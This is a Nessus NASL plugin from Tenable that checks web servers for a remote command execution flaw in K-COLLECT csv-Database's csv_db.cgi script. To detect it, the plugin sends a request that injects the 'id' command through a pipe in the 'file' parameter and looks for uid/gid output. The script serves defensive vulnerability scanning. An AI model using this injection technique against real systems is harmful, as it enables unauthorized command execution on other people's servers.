#
# (C) Tenable Network Security
#

if(description)
{
 script_id(18563);
 script_bugtraq_id(14059);
  
 script_version("$Revision: 1.1 $");
 name["english"] = "K-COLLECT CSV-DB CSV_DB.CGI Remote Command Execution Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running K-COLLECT csv-Database, a web application
written in perl.

The remote version of this software is vulnerable to remote command 
execution flaw through the script 'cvs_db.cgi'.

A malicious user could exploit this flaw to execute arbitrary commands on 
the remote host.

Solution : Remove this script.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for K-COLLECT CSV-DB remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);


function check(req)
{
  req = string(req, "/csv_db.cgi?file=|id|");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL)exit(0);

  if ("uid=" >< buf && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:buf) && egrep (pattern:"www\.k-collect\.net/ target=_top>csv-Database Ver.* by K-COLLECT</a></div>", string:buf))
  {
   	security_hole(port);
	exit(0);
  }
 return(0);
}

foreach dir (cgi_dirs())
{
  check(req:dir);
}
